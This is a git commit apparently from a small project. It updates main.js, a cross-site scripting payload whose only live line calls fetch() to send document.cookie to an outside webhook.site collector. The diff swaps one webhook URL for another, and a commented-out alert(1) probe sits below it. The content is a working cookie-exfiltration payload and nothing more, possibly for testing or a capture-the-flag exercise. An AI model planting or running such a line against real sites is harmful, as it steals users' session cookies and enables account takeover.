e119957581eb46e8d46cf341e05fb71a0db81747
0xd1360 <93290842+diegojoel301@users.noreply.github.com>
2025-08-02 23:09:44 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,2 +1,2 @@
-fetch("https://webhook.site/67da8974-bf85-4fcf-b226-3c5f674d0c0b" + document.cookie);
+fetch("https://webhook.site/12c78b01-b7b7-402a-9e2a-801577b25996/?cookie=" + document.cookie);
 //alert(1);
